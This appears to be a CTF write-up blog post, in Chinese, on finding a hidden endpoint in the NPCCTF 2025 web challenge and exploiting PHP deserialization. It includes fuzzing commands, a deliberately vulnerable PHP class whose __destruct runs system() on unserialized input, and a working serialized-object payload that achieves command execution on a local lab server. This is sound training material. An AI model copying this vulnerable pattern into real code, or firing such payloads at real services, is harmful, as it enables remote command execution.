---
title: "伪装主页 + 隐藏入口 + 反序列化（NPCCTF 2025）"
slug: "ctf-npc-hidden-entry"
date: 2026-08-28T16:01:43+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从伪装首页找到隐藏入口，再顺着反序列化点拿下 flag。"
summary: "从伪装首页找到隐藏入口，再顺着反序列化点拿下 flag。"
tags: ["CTF", "反序列化", "Web"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 2
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/2.伪装主页 + 隐藏入口 + 反序列化.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-npc-hidden-entry/workflow.svg" alt="从极简首页和抓包结果找到隐藏入口，再进入反序列化链。" loading="lazy">
  <figcaption>图 1 · NPC 隐藏入口与反序列化。从极简首页和抓包结果找到隐藏入口，再进入反序列化链。</figcaption>
</figure>

## 1. 题目已知信息

题目是 **NPCCTF 2025 week1-web / Please wake me up**。首页只有两个按钮：

- 呼叫小 U；
- 挂断电话。

![NPCCTF 隐藏入口题的极简首页](/images/notes/ctf-npc-hidden-entry/home.png)

公开笔记没有保留隐藏路径和最终类名，所以这篇文章分成两部分：

1. 如何从这种页面找到真正入口；
2. 如何用本地 PHP 最小环境复现“隐藏入口 → 反序列化 → 命令执行”的机制。

## 2. 找到隐藏入口

先固定目标地址：

```bash
export TARGET='http://127.0.0.1:<target-port>'
mkdir -p /tmp/npc
curl -sS -D /tmp/npc/headers.txt "$TARGET/" -o /tmp/npc/home.html
```

查看页面引用的脚本、按钮事件和接口：

```bash
rg -n 'href=|src=|fetch\(|axios|onclick|addEventListener' /tmp/npc/home.html
```

然后用 Burp 或浏览器开发者工具点击两个按钮，记录：

- 请求方法；
- 完整路径；
- 查询参数或 JSON 字段；
- 响应状态和长度；
- 是否存在 `data`、`payload`、`person` 之类的参数。

如果按钮请求没有直观路径，可以再做一轮小字典：

```bash
ffuf -u "$TARGET/FUZZ" \
  -w /path/to/SecLists/Discovery/Web-Content/common.txt \
  -mc all -fs 0
```

把真正的请求记录成：

```bash
export HIDDEN_URL="$TARGET/<hidden-endpoint>"
export PARAM='<parameter-name>'
```

## 3. 本地复现反序列化机制

> 原题的具体类名没有保留在公开笔记里。下面的代码不是原题 POC，而是用同一机制搭建的最小可运行环境。

创建 `/tmp/npc/index.php`：

```php
<?php
class Ping {
    public string $cmd = "whoami";

    public function __destruct() {
        system($this->cmd);
    }
}

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
```

启动：

```bash
cd /tmp/npc
php -S 127.0.0.1:8080
```

另开终端生成 payload：

```php
<?php
class Ping {
    public string $cmd = "id";
}

echo urlencode(serialize(new Ping()));
```

保存为 `/tmp/npc/build.php` 后执行：

```bash
PAYLOAD="$(php /tmp/npc/build.php)"
curl -i -sS --get --data-urlencode "data=$PAYLOAD" \
  'http://127.0.0.1:8080/'
```

预期响应里出现当前用户信息。把 `id` 改为 `ls -la`、`cat /flag` 可以继续验证。

## 4. 回到原题时要替换什么

| 本地环境 | 原题 |
| --- | --- |
| `data` 参数 | 隐藏入口实际参数 |
| `Ping::__destruct()` | 目标类魔法方法 |
| `system($cmd)` | 目标危险 sink |
| PHP 8 | 题目实际 PHP 版本 |

构造 payload 前必须先拿到目标类源码，不要拿着本地类名直接打原题。

## 5. 排错

- 首页所有请求都只有静态资源：检查 JS bundle、source map 和按钮事件监听；
- 参数存在但 `unserialize` 不触发：确认 magic method 与对象生命周期；
- payload 被 URL 二次编码：让 `curl --data-urlencode` 只编码一次；
- 目标有 `allowed_classes`：需要按白名单内可用类重新审计。

## 6. 复现检查表

- [ ] 找到按钮对应的真实请求
- [ ] 记录隐藏路径和参数名
- [ ] 拿到目标类源码或确认可加载类
- [ ] 本地验证序列化字符串
- [ ] 原题只替换类名、属性和 sink
